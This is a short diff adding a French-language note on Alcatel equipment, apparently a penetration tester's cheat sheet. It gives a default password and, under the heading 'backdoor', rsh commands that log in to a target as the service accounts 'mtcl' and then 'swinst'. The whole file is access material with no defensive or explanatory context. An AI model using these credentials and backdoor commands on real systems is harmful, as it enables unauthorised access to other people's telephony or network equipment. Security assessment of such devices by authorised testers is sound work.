@@ -1,0 +1,9 @@
+# alcatel
+
+# Mot de passe par defaut
+LeTacLa
+
+# backdoor
+rsh <ip> -l mtcl id
+puis
+rsh localhost -l swinst id
